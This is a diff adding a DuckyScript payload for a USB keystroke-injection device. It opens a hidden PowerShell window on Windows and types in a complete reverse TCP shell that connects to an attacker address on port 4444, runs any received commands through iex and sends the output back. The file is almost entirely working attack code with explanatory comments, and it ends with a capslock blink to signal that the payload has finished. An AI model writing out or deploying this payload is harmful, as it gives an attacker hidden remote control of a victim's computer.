@@ -1,0 +1,39 @@
+REM This code was written by Hardstone...
+REM  Simple Reverse TCP Shell on windows...
+DELAY 2000
+REM Open PowerShell...
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 600
+REM -w means that the app should start with this setting...
+
+REM Establish reverse shell connection...
+STRING $client = New-Object System.Net.Sockets.TCPClient('192.168.100.93', 4444);
+REM this line creates a socket to send and recieve tcp traffic...
+REM the ip address of attacker machine is 192.168.100.93 and the listening port address is 4444...
+STRING $stream = $client.GetStream(); 
+STRING [byte[]]$bytes = 0..65535|%{0}; 
+STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); 
+STRING $sendback = (iex $data 2>&1 | Out-String ); 
+STRING $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; 
+STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
+STRING $stream.Write($sendbyte,0,$sendbyte.Length); 
+STRING $stream.Flush()};
+REM stream.flush() means that the stream will continue to send the text simultainously with the input.
+ENTER
+REM payload completiion indicator...
+REM the capslock light blinks 3 times...
+DELAY 300
+CAPSLOCK
+DELAY 300
+CAPSLOCK
+DELAY 300
+CAPSLOCK
+DELAY 300
+CAPSLOCK
+DELAY 300
+CAPSLOCK
+DELAY 300
+CAPSLOCK
